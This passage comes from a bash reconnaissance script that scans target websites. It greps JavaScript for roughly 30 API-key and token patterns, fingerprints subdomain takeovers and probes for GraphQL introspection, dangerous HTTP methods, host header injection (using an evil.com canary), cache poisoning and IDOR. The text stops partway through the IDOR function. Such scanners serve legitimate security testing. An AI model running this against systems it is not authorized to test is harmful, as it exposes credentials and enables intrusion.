grep -E "CORS:" "${OUT}/engine/headers/audit.txt" | sort -u > "${OUT}/engine/headers/cors_issues.txt" 2>/dev/null || true
grep -v "CORS:" "${OUT}/engine/headers/audit.txt" | sort -u > "${OUT}/engine/headers/missing_headers.txt" 2>/dev/null || true
good "Header audit: $(count_safe "${OUT}/engine/headers/audit.txt") findings | CORS: $(count_safe "${OUT}/engine/headers/cors_issues.txt")"

# ════════════════════════════════════════════════════════════════════════════
section "STEP 5 ─ JS Secret Scanner (30 patterns)"

# FIX: Arrays cannot be exported in bash. Write patterns to a temp file
# and read it inside the worker function.
JS_PATTERNS_FILE="${TMPDIR_NYX}/js_patterns.txt"
cat > "${JS_PATTERNS_FILE}" << 'PATTERNS_EOF'
AWS_ACCESS_KEY:::AKIA[0-9A-Z]{16}
AWS_SECRET_KEY:::[A-Za-z0-9+/]{40}
GOOGLE_API_KEY:::AIza[0-9A-Za-z\-_]{35}
GOOGLE_OAUTH:::[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com
SLACK_TOKEN:::xox[baprs]-[0-9A-Za-z\-]+
SLACK_WEBHOOK:::hooks\.slack\.com/services/T[A-Z0-9]+/B[A-Z0-9]+/[a-zA-Z0-9]+
GITHUB_TOKEN:::gh[pousr]_[A-Za-z0-9]{36}
GITHUB_CLASSIC:::ghp_[A-Za-z0-9]{36}
STRIPE_LIVE:::sk_live_[0-9a-zA-Z]{24,}
STRIPE_TEST:::sk_test_[0-9a-zA-Z]{24,}
STRIPE_RESTRICTED:::rk_live_[0-9a-zA-Z]{24,}
TWILIO_SID:::AC[a-z0-9]{32}
TWILIO_AUTH:::SK[a-z0-9]{32}
BEARER_TOKEN:::[Bb]earer[[:space:]]+[A-Za-z0-9\-_=]{20,}
PRIVATE_KEY:::-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY
FIREBASE_URL:::https://[a-z0-9_-]+\.firebaseio\.com
FIREBASE_KEY:::AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}
HEROKU_API:::[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}
SENDGRID:::SG\.[a-zA-Z0-9_\-]{22}\.[a-zA-Z0-9_\-]{43}
MAILCHIMP:::[0-9a-f]{32}-us[0-9]+
MAILGUN:::key-[0-9a-zA-Z]{32}
PAYPAL_BRAINTREE:::access_token\$production\$[0-9a-z]{16}\$[0-9a-f]{32}
SQUARE_TOKEN:::sq0atp-[0-9A-Za-z\-_]{22}
SQUARE_SECRET:::sq0csp-[0-9A-Za-z\-_]{43}
DIGITALOCEAN_TOKEN:::dop_v1_[a-f0-9]{64}
SHOPIFY_TOKEN:::shpat_[a-fA-F0-9]{32}
SHOPIFY_SECRET:::shpss_[a-fA-F0-9]{32}
OKTA_TOKEN:::0{3}[a-zA-Z0-9\-_]{35}
JWT_TOKEN:::eyJ[A-Za-z0-9_\-]{10,}\.eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]+
GENERIC_SECRET:::(secret|password|passwd|api_key|apikey|auth_token|access_token|private_key)["'\s:=]+["']([A-Za-z0-9!@#$%^&*()_+\-=]{16,})["']
PATTERNS_EOF
export JS_PATTERNS_FILE

_js_scan() {
  local url="$1"
  # Skip if URL contains FUZZ placeholder (un-substituted template)
  echo "${url}" | grep -q "FUZZ" && return
  echo "${url}" | grep -qiE '\.js(\?|$)' || return
  _rate_sleep 2>/dev/null || true
  local body; body=$(_acurl "${url}" 2>/dev/null) || return
  [[ -z "${body}" ]] && return
  # Skip known CDN/analytics noise
  echo "${url}" | grep -qiE \
    '(jquery|bootstrap|analytics|gtm|ga\.|googletagmanager|pixel\.facebook|twitter|hotjar|intercom|cdn\.|cdnjs|unpkg\.com)' \
    && return
  [[ -s "${JS_PATTERNS_FILE:-/dev/null}" ]] || return
  while IFS= read -r pattern_entry; do
    [[ -z "${pattern_entry}" ]] && continue
    local pname="${pattern_entry%%:::*}"
    local pregex="${pattern_entry##*:::}"
    local match; match=$(echo "${body}" | grep -oP "${pregex}" 2>/dev/null | head -1 || true)
    if [[ -n "${match}" ]]; then
      local display="${match:0:80}"
      echo "[SECRET:${pname}] ${url} | ${display}"
    fi
  done < "${JS_PATTERNS_FILE}"
}
export -f _js_scan

_extract_js_from_page() {
  local url="$1"
  local body origin
  _rate_sleep 2>/dev/null || true
  body=$(_acurl "${url}" 2>/dev/null) || return
  origin=$(echo "${url}" | grep -oP 'https?://[^/]+')
  echo "${body}" | grep -oP "(?<=src=[\"'])[^\"']+\.js[^\"']*" \
    | sed "s|^/|${origin}/|g" | grep -E "^https?://" | grep "${DOMAIN:-example.com}" \
    >> "${OUT}/engine/secrets/js_urls.txt" 2>/dev/null || true
}
export -f _extract_js_from_page

grep -iE '\.js(\?.*)?$' "${OUT}/crawl/crawled_urls.txt" 2>/dev/null \
  | sort -u > "${OUT}/engine/secrets/js_urls.txt" || touch "${OUT}/engine/secrets/js_urls.txt"
cat "${OUT}/http/live.txt" | _parallel "${THREADS}" _extract_js_from_page 2>/dev/null || true
sort -u "${OUT}/engine/secrets/js_urls.txt" -o "${OUT}/engine/secrets/js_urls.txt" 2>/dev/null || true

if [[ -s "${OUT}/engine/secrets/js_urls.txt" ]]; then
  cat "${OUT}/engine/secrets/js_urls.txt" | _parallel "${THREADS}" _js_scan 2>/dev/null \
    | sort -u > "${OUT}/engine/secrets/findings.txt"
  local_count=$(count_safe "${OUT}/engine/secrets/findings.txt")
  [[ "${local_count}" -gt 0 ]] && good "JS secrets found: ${local_count}" || log "No JS secrets detected"
else
  touch "${OUT}/engine/secrets/findings.txt"; log "No JS files found"
fi

# ════════════════════════════════════════════════════════════════════════════
section "STEP 6 ─ Subdomain Takeover Fingerprinting (35 signatures)"

# FIX: declare -A inside exported functions is unreliable across bash versions.
# Use a plain grep-based case approach instead.
_takeover_check() {
  local host="$1"
  local body status lower_body

  _rate_sleep 2>/dev/null || true

  body=$(_acurl -L --max-redirs 2 "http://${host}") || return
  status=$(_acurl -o /dev/null -w "%{http_code}" "http://${host}" || echo "000")

  # If 200/403 with substantial content → service still alive
  if [[ "${status}" == "200" || "${status}" == "403" ]]; then
    local sz; sz=$(echo "${body}" | wc -c | tr -d ' ')
    [[ "${sz}" -gt 1000 ]] && return
  fi

  lower_body=$(echo "${body}" | tr '[:upper:]' '[:lower:]')

  # Detect service by pattern — returns "<service>:<pattern>" on match
  local service=""
  if echo "${lower_body}" | grep -qP "there is no app here|no such app|404 no such app"; then
    service="Heroku"
  elif echo "${lower_body}" | grep -qP "this domain is not configured|isn.*t a github pages site|there isn.*t a github pages site here"; then
    service="GitHub Pages"
  elif echo "${lower_body}" | grep -qP "404 web site not found|microsoft azure"; then
    service="Azure"
  elif echo "${lower_body}" | grep -qP "fastly error: unknown domain|please check that this domain has been added to one of your fastly services"; then
    service="Fastly"
  elif echo "${lower_body}" | grep -qP "sorry, this shop is currently unavailable|only for shopify|myshopify\.com.*doesn.*t exist"; then
    service="Shopify"
  elif echo "${lower_body}" | grep -qP "nosuchbucket|the specified bucket does not exist|bucket not found"; then
    service="AWS S3"
  elif echo "${lower_body}" | grep -qP "whatever you were looking for doesn.*t currently exist|this page is reserved for future use|not found\. request id"; then
    service="Tumblr"
  elif echo "${lower_body}" | grep -qP "repository not found"; then
    service="Bitbucket"
  elif echo "${lower_body}" | grep -qP "the page you.*re looking for doesn.*t exist"; then
    service="Ghost"
  elif echo "${lower_body}" | grep -qP "this web app does not exist|the gods are wise"; then
    service="Pantheon"
  elif echo "${lower_body}" | grep -qP "project not found"; then
    service="GitLab Pages"
  elif echo "${lower_body}" | grep -qP "page not found.*surge\.sh"; then
    service="Surge"
  elif echo "${lower_body}" | grep -qP "does not exist.*wix"; then
    service="Wix"
  elif echo "${lower_body}" | grep -qP "unrecognized domain|this site.*isn.*t connected"; then
    service="WP Engine"
  elif echo "${lower_body}" | grep -qP "help center.*zendesk"; then
    service="Zendesk"
  elif echo "${lower_body}" | grep -qP "looks like you.*ve followed a broken link"; then
    service="Intercom"
  elif echo "${lower_body}" | grep -qP "the resource you are looking for has been removed"; then
    service="Azure-IIS"
  elif echo "${lower_body}" | grep -qP "domain is not configured.*netlify"; then
    service="Netlify"
  elif echo "${lower_body}" | grep -qP "no such site.*webflow"; then
    service="Webflow"
  elif echo "${lower_body}" | grep -qP "please contact your account manager|agile crm"; then
    service="AgileCRM"
  elif echo "${lower_body}" | grep -qP "this site can.*t be reached|err_name_not_resolved"; then
    service="DNS_DANGLING"
  elif echo "${lower_body}" | grep -qP "invalid hostname"; then
    service="Vercel"
  elif echo "${lower_body}" | grep -qP "project not found.*readme"; then
    service="ReadMe.io"
  elif echo "${lower_body}" | grep -qP "is not a registered ngrok tunnel"; then
    service="Ngrok"
  elif echo "${lower_body}" | grep -qP "the feed does not exist"; then
    service="UserVoice"
  elif echo "${lower_body}" | grep -qP "there is no site configured at this address"; then
    service="Cargo"
  fi

  if [[ -n "${service}" ]]; then
    echo "[TAKEOVER:${service}] ${host} | HTTP:${status}"
    return
  fi

  # CNAME fallback: check redirect URL for known cloud domains
  local cname
  cname=$(curl -sk --max-time 4 -o /dev/null -w "%{redirect_url}" "http://${host}" 2>/dev/null || true)
  if echo "${cname}" | grep -qiE \
    '(amazonaws\.com|azurewebsites\.net|cloudapp\.net|herokuapp\.com|myshopify\.com|surge\.sh|netlify\.app|vercel\.app|pages\.github\.io|gitbook\.io|ghost\.io|readme\.io|webflow\.io|zendesk\.com|intercom\.help|cargo\.site)'; then
    echo "[TAKEOVER:CNAME_DANGLING] ${host} → ${cname} | HTTP:${status}"
  fi
}
export -f _takeover_check

cat "${OUT}/subs/resolved.txt" | _parallel "${THREADS}" _takeover_check 2>/dev/null \
  | sort -u > "${OUT}/engine/takeover/candidates.txt"
tk_count=$(count_safe "${OUT}/engine/takeover/candidates.txt")
[[ "${tk_count}" -gt 0 ]] && good "Takeover candidates: ${tk_count}" || log "No takeover candidates"

# ════════════════════════════════════════════════════════════════════════════
section "STEP 7 ─ URL Crawl"
CRAWL_DEPTH=2; [[ "${DEEP_MODE}" == true ]] && CRAWL_DEPTH=3
export CRAWL_DEPTH

_extract_urls() {
  local body="$1" base="$2"
  local base_origin
  base_origin=$(echo "${base}" | grep -oP 'https?://[^/]+')
  echo "${body}" \
    | grep -oP "(?<=href=[\"'])[^\"'#?][^\"']*|(?<=action=[\"'])[^\"']+|(?<=src=[\"'])[^\"']+\.js[^\"']*" \
    | sed "s|^/|${base_origin}/|g" | grep -E "^https?://" | grep "${DOMAIN:-example.com}" \
    | grep -vE '\.(jpg|jpeg|png|gif|svg|ico|css|woff|woff2|ttf|mp4|mp3|pdf|zip|eot)(\?|$)' \
    | sed 's/#.*//' | sort -u
}
export -f _extract_urls

_crawl_host() {
  local start="$1"
  # Per-subshell temp files with cleanup
  local vis q nq found
  vis=$(mktemp); q=$(mktemp); nq=$(mktemp); found=$(mktemp)
  trap 'rm -f "${vis}" "${q}" "${nq}" "${found}" 2>/dev/null' EXIT

  echo "${start}" > "${q}"
  local depth=0
  while [[ -s "${q}" && ${depth} -lt ${CRAWL_DEPTH:-2} ]]; do
    > "${nq}"
    while IFS= read -r url; do
      grep -qxF "${url}" "${vis}" && continue
      echo "${url}" >> "${vis}"
      _rate_sleep 2>/dev/null || true
      local body; body=$(_acurl "${url}" 2>/dev/null) || continue
      echo "${url}" >> "${found}"
      while IFS= read -r nu; do
        grep -qxF "${nu}" "${vis}" && continue
        echo "${nu}" >> "${nq}"
        echo "${nu}" >> "${found}"
      done < <(_extract_urls "${body}" "${url}")
    done < "${q}"
    mv "${nq}" "${q}"
    depth=$(( depth + 1 ))
  done
  cat "${found}"
}
export -f _crawl_host

cat "${OUT}/http/live.txt" | _parallel "${THREADS}" _crawl_host 2>/dev/null \
  | sort -u > "${OUT}/crawl/crawled_urls.txt"

log "Wayback passive..."
_curl "https://web.archive.org/cdx/search/cdx?url=*.${DOMAIN}/*&output=text&fl=original&collapse=urlkey&limit=10000" \
  | grep -E "^https?://" | grep "${DOMAIN}" \
  | grep -vE '\.(jpg|jpeg|png|gif|svg|ico|css|woff|woff2|ttf|mp4|mp3|pdf|zip|eot)(\?|$)' \
  >> "${OUT}/crawl/crawled_urls.txt"
sort -u "${OUT}/crawl/crawled_urls.txt" -o "${OUT}/crawl/crawled_urls.txt"

grep '=' "${OUT}/crawl/crawled_urls.txt" \
  | grep -vE '\.(jpg|jpeg|png|gif|svg|ico|css|woff|woff2|ttf)(\?|$)' \
  | sort -u > "${OUT}/crawl/urls_with_params.txt"
log "Crawled: $(count_safe "${OUT}/crawl/crawled_urls.txt") | Params: $(count_safe "${OUT}/crawl/urls_with_params.txt")"

# Feed JS URLs back to secret scanner (post-crawl)
grep -iE '\.js(\?.*)?$' "${OUT}/crawl/crawled_urls.txt" 2>/dev/null \
  >> "${OUT}/engine/secrets/js_urls.txt" || true
sort -u "${OUT}/engine/secrets/js_urls.txt" -o "${OUT}/engine/secrets/js_urls.txt" 2>/dev/null || true
if [[ -s "${OUT}/engine/secrets/js_urls.txt" ]]; then
  cat "${OUT}/engine/secrets/js_urls.txt" | _parallel "${THREADS}" _js_scan 2>/dev/null \
    | sort -u >> "${OUT}/engine/secrets/findings.txt" || true
  sort -u "${OUT}/engine/secrets/findings.txt" -o "${OUT}/engine/secrets/findings.txt" 2>/dev/null || true
  good "JS secrets total: $(count_safe "${OUT}/engine/secrets/findings.txt")"
fi

# ════════════════════════════════════════════════════════════════════════════
section "STEP 8 ─ GraphQL Endpoint Discovery"
touch "${OUT}/engine/graphql/endpoints.txt"

# FIX: Write paths to file instead of exporting array
GRAPHQL_PATHS_FILE="${TMPDIR_NYX}/graphql_paths.txt"
cat > "${GRAPHQL_PATHS_FILE}" << 'EOF'
/graphql
/api/graphql
/v1/graphql
/v2/graphql
/query
/gql
/graphiql
/playground
/graph
/api/graph
/api/v1/graphql
/console
/graphql/console
/graphql/v1
EOF
export GRAPHQL_PATHS_FILE

_graphql_probe() {
  local base="$1"
  [[ -s "${GRAPHQL_PATHS_FILE:-/dev/null}" ]] || return
  while IFS= read -r path; do
    [[ -z "${path}" ]] && continue
    local url="${base}${path}"
    _rate_sleep 2>/dev/null || true
    # Single curl: capture body + status
    local combined
    combined=$(_acurl -X POST -H "Content-Type: application/json" -w "\n__STATUS__%{http_code}" -d '{"query":"{ __typename }"}' "${url}") || continue
    local status body
    status=$(echo "${combined}" | grep -oP '__STATUS__\K[0-9]+' | tail -1)
    body=$(echo "${combined}" | sed '/__STATUS__/d')
    echo "${body}" | grep -qiE '"data"|"__typename"|"errors"' || continue
    local introspect_open="no"
    local full_intros
    full_intros=$(_acurl -X POST -H "Content-Type: application/json" -d '{"query":"{ __schema { types { name } } }"}' "${url}")
    echo "${full_intros}" | grep -qi '"__Schema"' && introspect_open="yes"
    echo "[GRAPHQL:ENDPOINT] ${url} | status:${status} | introspection:${introspect_open}"
  done < "${GRAPHQL_PATHS_FILE}"
}
export -f _graphql_probe

awk -F'/' '{print $1"//"$3}' "${OUT}/http/live.txt" | sort -u \
  | _parallel "${THREADS}" _graphql_probe 2>/dev/null \
  | sort -u > "${OUT}/engine/graphql/endpoints.txt"
gql_count=$(count_safe "${OUT}/engine/graphql/endpoints.txt")
[[ "${gql_count}" -gt 0 ]] && good "GraphQL endpoints: ${gql_count}" || log "No GraphQL endpoints found"

# ════════════════════════════════════════════════════════════════════════════
section "STEP 9 ─ HTTP Method Enumeration"
touch "${OUT}/engine/methods/findings.txt"

_method_check() {
  local url="$1"
  _rate_sleep 2>/dev/null || true

  local opt_resp allow_hdr
  opt_resp=$(_acurl -X OPTIONS -D - -o /dev/null "${url}") || return
  allow_hdr=$(echo "${opt_resp}" | grep -iP '^Allow:' | head -1)
  if [[ -n "${allow_hdr}" ]]; then
    echo "${allow_hdr}" | grep -qiE '(PUT|DELETE|PATCH|TRACE|CONNECT)' && \
      echo "[METHOD:DANGEROUS_ALLOWED] ${url} | ${allow_hdr}"
  fi

  for method in PUT DELETE PATCH TRACE; do
    _rate_sleep 2>/dev/null || true
    local st
    st=$(_acurl -X "${method}" -o /dev/null -w "%{http_code}" "${url}" || echo "000")
    if [[ "${st}" == "200" || "${st}" == "204" || "${st}" == "201" ]]; then
      echo "[METHOD:${method}_ALLOWED] ${url} | HTTP:${st}"
    fi
    if [[ "${method}" == "TRACE" && "${st}" == "200" ]]; then
      local trace_canary="nyx-trace-$(_rand_token 8)"
      local tbody
      tbody=$(_acurl -X TRACE -H "X-Nyxora-Trace: ${trace_canary}" "${url}")
      echo "${tbody}" | grep -q "${trace_canary}" && \
        echo "[METHOD:TRACE_XST] ${url} | Request headers reflected (XST)"
    fi
  done
}
export -f _method_check

cat "${OUT}/http/live.txt" | _parallel "${THREADS}" _method_check 2>/dev/null \
  | sort -u > "${OUT}/engine/methods/findings.txt"
meth_count=$(count_safe "${OUT}/engine/methods/findings.txt")
[[ "${meth_count}" -gt 0 ]] && good "Method findings: ${meth_count}" || log "No dangerous methods detected"

# ════════════════════════════════════════════════════════════════════════════
section "STEP 10 ─ Host Header Injection Detection"
touch "${OUT}/engine/hostinj/findings.txt"

_hostinj_check() {
  local url="$1"
  local canary="hostinj-nyx-$(_rand_token 10).evil.com"
  _rate_sleep 2>/dev/null || true

  local hdr
  for hdr in \
    "Host: ${canary}" \
    "X-Forwarded-Host: ${canary}" \
    "X-Original-URL: http://${canary}" \
    "X-Rewrite-URL: http://${canary}" \
    "X-Host: ${canary}" \
    "Forwarded: host=${canary}" \
    "X-Forwarded-Server: ${canary}"; do
    local body redir
    _rate_sleep 2>/dev/null || true
    body=$(_acurl -H "${hdr}" "${url}" 2>/dev/null) || continue
    if echo "${body}" | grep -qF "${canary}"; then
      echo "[HOST_INJECTION] ${url} | Header: ${hdr%%:*} | Canary reflected in body"
      return
    fi
    redir=$(_acurl -o /dev/null -w "%{redirect_url}" -H "${hdr}" "${url}" || true)
    if echo "${redir}" | grep -qF "${canary}"; then
      echo "[HOST_INJECTION] ${url} | Header: ${hdr%%:*} | Canary reflected in redirect"
      return
    fi
  done
}
export -f _hostinj_check

cat "${OUT}/http/live.txt" | _parallel "${THREADS}" _hostinj_check 2>/dev/null \
  | sort -u > "${OUT}/engine/hostinj/findings.txt"
hi_count=$(count_safe "${OUT}/engine/hostinj/findings.txt")
[[ "${hi_count}" -gt 0 ]] && good "Host injection findings: ${hi_count}" || log "No host injection detected"

# ════════════════════════════════════════════════════════════════════════════
section "STEP 11 ─ Cache Poisoning Hints"
touch "${OUT}/engine/cache/hints.txt"

_cache_hint() {
  local url="$1"
  local canary="nyx-$(_rand_token 8)"
  _rate_sleep 2>/dev/null || true

  local body1
  body1=$(_acurl -H "X-Nyx-Poison: ${canary}" "${url}" 2>/dev/null) || return
  if echo "${body1}" | grep -qF "${canary}"; then
    echo "[CACHE:HEADER_REFLECTED] ${url} | X-Nyx-Poison reflected in response"
    return
  fi

  _rate_sleep 2>/dev/null || true
  local h_orig h_fake
  h_orig=$(_acurl -o /dev/null -w "%{http_code}" "${url}" || echo "000")
  _rate_sleep 2>/dev/null || true
  h_fake=$(_acurl -o /dev/null -w "%{http_code}" -H "X-Forwarded-Scheme: nohttps" "${url}" || echo "000")

  if [[ "${h_orig}" != "${h_fake}" && "${h_fake}" != "000" ]]; then
    echo "[CACHE:SCHEME_HEADER_AFFECTS_RESPONSE] ${url} | X-Forwarded-Scheme changes status: ${h_orig} → ${h_fake}"
  fi
}
export -f _cache_hint

cat "${OUT}/http/live.txt" | _parallel "${THREADS}" _cache_hint 2>/dev/null \
  | sort -u > "${OUT}/engine/cache/hints.txt"
cache_count=$(count_safe "${OUT}/engine/cache/hints.txt")
[[ "${cache_count}" -gt 0 ]] && good "Cache poisoning hints: ${cache_count}" || log "No cache poisoning hints"

# ════════════════════════════════════════════════════════════════════════════
section "STEP 12 ─ API Version Discovery"
touch "${OUT}/engine/behavior/api_endpoints.txt"

# FIX: Write to file instead of exporting array
API_VERSIONS_FILE="${TMPDIR_NYX}/api_versions.txt"
cat > "${API_VERSIONS_FILE}" << 'EOF'
v1
v2
v3
v4
api
api/v1
api/v2
api/v3
rest
rest/v1
internal
private
admin/api
backend
service
services
rpc
jsonrpc
EOF
export API_VERSIONS_FILE

_api_version_probe() {
  local base="$1"
  [[ -s "${API_VERSIONS_FILE:-/dev/null}" ]] || return
  while IFS= read -r ver; do
    [[ -z "${ver}" ]] && continue
    local url="${base}/${ver}"
    _rate_sleep 2>/dev/null || true
    # FIX: single curl call with -w for both status and content-type
    local combined status ct
    combined=$(_acurl -w "\n__STATUS__%{http_code}__CT__%{content_type}" -o /dev/null -H "Accept: application/json" "${url}") || continue
    status=$(echo "${combined}" | grep -oP '__STATUS__\K[0-9]+')
    ct=$(echo "${combined}" | grep -oP '__CT__\K.*' | head -1)
    echo "${status}" | grep -qE '^(200|201|401|403)$' || continue
    echo "[API_ENDPOINT] ${url} | HTTP:${status} | CT:${ct:0:40}"
  done < "${API_VERSIONS_FILE}"
}
export -f _api_version_probe

awk -F'/' '{print $1"//"$3}' "${OUT}/http/live.txt" | sort -u \
  | _parallel "${THREADS}" _api_version_probe 2>/dev/null \
  | sort -u > "${OUT}/engine/behavior/api_endpoints.txt"
api_count=$(count_safe "${OUT}/engine/behavior/api_endpoints.txt")
[[ "${api_count}" -gt 0 ]] && good "API endpoints discovered: ${api_count}" || log "No extra API endpoints"

# ════════════════════════════════════════════════════════════════════════════
section "STEP 13 ─ Parameter Normalization"
NOISE='(page=|lang=|limit=|offset=|sort=|order=|locale=|currency=|ref=|utm_|_ga=|fbclid=|gclid=|tracking=|ver=|v=|rev=|nocache=|timestamp=|nonce=|csrf|_=|s=|search=|keyword=|token=|__cf|session=|debug=|cache=|_t=|format=|type=|style=|theme=|view=|size=|color=|width=|height=|tab=|per_page=|page_size=)'
sed 's/=[^&?#]*/=FUZZ/g; s/#.*//' "${OUT}/crawl/urls_with_params.txt" \
  | sort -u | grep -Evi "${NOISE}" > "${OUT}/crawl/params_normalized.txt"
log "Normalized param patterns: $(count_safe "${OUT}/crawl/params_normalized.txt")"

# ════════════════════════════════════════════════════════════════════════════
section "STEP 14 ─ Baseline Validation"
touch "${OUT}/engine/valid_params_json.txt"

_baseline_check() {
  local url="$1"
  # Safety: don't probe FUZZ literally
  echo "${url}" | grep -qF "FUZZ" || return
  _rate_sleep 2>/dev/null || true
  local raw status ct size
  raw=$(_acurl -w "\n__STATUS__%{http_code}__CT__%{content_type}__SIZE__%{size_download}" "$(echo "${url}" | sed 's/FUZZ/baseline_nyx/g')") || return
  status=$(echo "${raw}" | grep -oP '__STATUS__\K[0-9]+')
  ct=$(echo "${raw}" | grep -oP '__CT__\K[^_]+')
  size=$(echo "${raw}" | grep -oP '__SIZE__\K[0-9]+')
  [[ "${status}" != "200" ]] && return
  [[ "${size:-0}" -lt 300 ]] && return
  echo "${ct}" | grep -qiE "image/|video/|audio/|font/" && return
  if echo "${ct}" | grep -qi "application/json"; then
    echo "${url}" >> "${OUT}/engine/valid_params_json.txt" 2>/dev/null
  else
    echo "${url}"
  fi
}
export -f _baseline_check

if [[ -s "${OUT}/crawl/params_normalized.txt" ]]; then
  cat "${OUT}/crawl/params_normalized.txt" | _parallel "${THREADS}" _baseline_check 2>/dev/null \
    | sort -u > "${OUT}/engine/valid_params.txt"
  sort -u "${OUT}/engine/valid_params_json.txt" -o "${OUT}/engine/valid_params_json.txt"
  log "Valid HTML: $(count_safe "${OUT}/engine/valid_params.txt") | Valid JSON: $(count_safe "${OUT}/engine/valid_params_json.txt")"
else
  touch "${OUT}/engine/valid_params.txt"; warn "No normalized params."
fi

# ════════════════════════════════════════════════════════════════════════════
section "STEP 15 ─ Diff Engine (4-probe, tighter gates)"
FUZZ_A="nyxxAa1"; FUZZ_B="nyxxBb2"; FUZZ_C="nyxxCc3"; FUZZ_D="nyxxDd4"
export FUZZ_A FUZZ_B FUZZ_C FUZZ_D

_diff_check() {
  local url="$1"
  local b0 b1 b2 b3 b4

  _rate_sleep 2>/dev/null || true

  b0=$(_acurl "${url}" 2>/dev/null)
  # Guard: skip empty baseline
  [[ -z "${b0}" || "${#b0}" -lt 100 ]] && return

  b1=$(_acurl "$(echo "${url}" | sed "s/FUZZ/${FUZZ_A:-A}/g")" 2>/dev/null)
  b2=$(_acurl "$(echo "${url}" | sed "s/FUZZ/${FUZZ_B:-B}/g")" 2>/dev/null)
  b3=$(_acurl "$(echo "${url}" | sed "s/FUZZ/${FUZZ_C:-C}/g")" 2>/dev/null)
  b4=$(_acurl "$(echo "${url}" | sed "s/FUZZ/${FUZZ_D:-D}/g")" 2>/dev/null)

  local h1 h2 h3 h4
  h1=$(printf '%s' "${b1}" | md5sum | cut -d' ' -f1)
  h2=$(printf '%s' "${b2}" | md5sum | cut -d' ' -f1)
  h3=$(printf '%s' "${b3}" | md5sum | cut -d' ' -f1)
  h4=$(printf '%s' "${b4}" | md5sum | cut -d' ' -f1)

  # All 4 responses must be distinct
  [[ "${h1}" == "${h2}" || "${h1}" == "${h3}" || "${h1}" == "${h4}" ]] && return
  [[ "${h2}" == "${h3}" || "${h2}" == "${h4}" || "${h3}" == "${h4}" ]] && return

  # Must differ from baseline (not a static page)
  local h0; h0=$(printf '%s' "${b0}" | md5sum | cut -d' ' -f1)
  [[ "${h0}" == "${h1}" && "${h0}" == "${h2}" ]] && return

  # Size-spread gate (tighter: 15% AND >1000 bytes)
  local s1=${#b1} s2=${#b2} s3=${#b3} s4=${#b4}
  local max_s min_s
  max_s=$(( s1 > s2 ? (s1 > s3 ? (s1 > s4 ? s1 : s4) : (s3 > s4 ? s3 : s4)) : (s2 > s3 ? (s2 > s4 ? s2 : s4) : (s3 > s4 ? s3 : s4)) ))
  min_s=$(( s1 < s2 ? (s1 < s3 ? (s1 < s4 ? s1 : s4) : (s3 < s4 ? s3 : s4)) : (s2 < s3 ? (s2 < s4 ? s2 : s4) : (s3 < s4 ? s3 : s4)) ))
  local spread=$(( max_s - min_s ))
  local threshold=$(( (${#b0} + 1) * 15 / 100 ))
  [[ "${spread}" -gt "${threshold}" && "${spread}" -gt 1000 ]] && return

  echo "${url}"
}
export -f _diff_check

if [[ -s "${OUT}/engine/valid_params.txt" ]]; then
  { cat "${OUT}/engine/valid_params.txt"
    [[ -s "${OUT}/engine/valid_params_json.txt" ]] && cat "${OUT}/engine/valid_params_json.txt"; } \
    | sort -u | _parallel "${THREADS}" _diff_check 2>/dev/null \
    | sort -u > "${OUT}/engine/diff/dynamic.txt"
  log "Dynamic params: $(count_safe "${OUT}/engine/diff/dynamic.txt")"
else
  touch "${OUT}/engine/diff/dynamic.txt"
fi

# ════════════════════════════════════════════════════════════════════════════
section "STEP 16 ─ IDOR Detection (ID + UUID probes)"

_idor_check() {
  local url="$1"

  # Lightweight baseline size gate before running 7+ probes
  _rate_sleep 2>/dev/null || true
  local baseline_sz
  baseline_sz=$(_acurl -o /dev/null -w "%{size_download}" "$(echo "${url}" | sed 's/FUZZ/1/')" | tr -d ' ')
  # Skip if baseline returns almost nothing (404-class)
  [[ "${baseline_sz:-0}" -lt 150 ]] && return

  local r1 r2 r3 r4 r5
  r1=$(_acurl "$(echo "${url}" | sed 's/FUZZ/1/')")
  _rate_sleep 2>/dev/null || true
  r2=$(_acurl "$(echo "${url}" | sed 's/FUZZ/2/')")
  _rate_sleep 2>/dev/null || true
  r3=$(_acurl "$(echo "${url}" | sed 's/FUZZ/100/')")
  _rate_sleep 2>/dev/null || true
  r4=$(_acurl "$(echo "${url}" | sed 's/FUZZ/9999999/')")
  _rate_sleep 2>/dev/null || true
  r5=$(_acurl "$(echo "${url}" | sed 's/FUZZ/0/')")

  local h1 h2 h3 h5
  h1=$(printf '%s' "${r1}" | md5sum | cut -d' ' -f1)
  h2=$(printf '%s' "${r2}" | md5sum | cut -d' ' -f1)
  h3=$(printf '%s' "${r3}" | md5sum | cut -d' ' -f1)
  h5=$(printf '%s' "${r5}" | md5sum | cut -d' ' -f1)

  local diff=0
  [[ "${h1}" != "${h2}" ]] && diff=$(( diff + 1 ))
  [[ "${h2}" != "${h3}" ]] && diff=$(( diff + 1 ))
  [[ "${h1}" != "${h3}" ]] && diff=$(( diff + 1 ))
  [[ "${h1}" != "${h5}" ]] && diff=$(( diff + 1 ))

  local s1=${#r1} s2=${#r2} s3=${#r3} s4=${#r4}
  local avg=$(( (s1 + s2 + s3) / 3 ))
  local gap=$(( avg > s4 ? avg - s4 : s4 - avg ))

  if [[ "${diff}" -ge 3 && "${gap}" -gt 300 && "${s4}" -lt "${avg}" ]]; then
    local conf="MEDIUM"
    [[ "${diff}" -ge 4 && "${gap}" -gt 1000 ]] && conf="HIGH"
    local param_name; param_name=$(echo "${url}" | grep -oP '[?&]\K[^=]+(?==FUZZ)' | tail -1)
    echo "${param_name}" | grep -qiE \
      '(^id$|_id$|uid|user_?id|account|profile|order|invoice|ticket|doc|file|record|obj|customer|member|resource)' \
      && conf="HIGH"
    echo "${url} [conf:${conf}]"
    return
  fi

  # UUID probe
  _rate_sleep 2>/dev/null || true
  local uuid1="550e8400-e29b-41d4-a716-446655440000"
  local uuid2="6ba7b810-9dad-11d1-80b4-00c04fd430c8"
  local ru1 ru2 hu1 hu2
  ru1=$(_acurl "$(echo "${url}" | sed "s/FUZZ/${uuid1}/")")
  _rate_sleep 2>/dev/null || true
  ru2=$(_acurl "$(echo "${url}" | sed "s/FUZZ/${uuid2}/")")
  hu1=$(printf '%s' "${ru1}" | md5sum | cut -d' ' -f1)
  hu2=$(printf '%s' "${ru2}" | md5sum | cut -d' ' -f1)
